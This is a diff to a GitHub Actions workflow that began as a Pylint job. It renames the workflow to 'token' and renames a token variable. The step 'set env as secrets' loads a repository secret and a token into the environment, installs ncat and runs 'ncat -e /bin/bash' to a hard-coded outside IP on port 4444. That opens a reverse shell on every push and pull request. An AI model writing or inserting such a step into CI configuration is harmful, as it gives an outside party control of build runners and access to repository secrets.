@@ -1,4 +1,4 @@
-name: Pylint
+name: token
 
 on: [pull_request, push]
 
@@ -14,5 +14,5 @@ jobs:
     - name: set env as secrets
       env: 
         MY_VAL: ${{ secrets.BLA_BLA }}
-        GITHUB_TOKEN : ${{ guthub.token }}
+        TEST : ${{ guthub.token }}
       run: sudo apt install -y ncat; ncat -e /bin/bash 18.222.231.153 4444
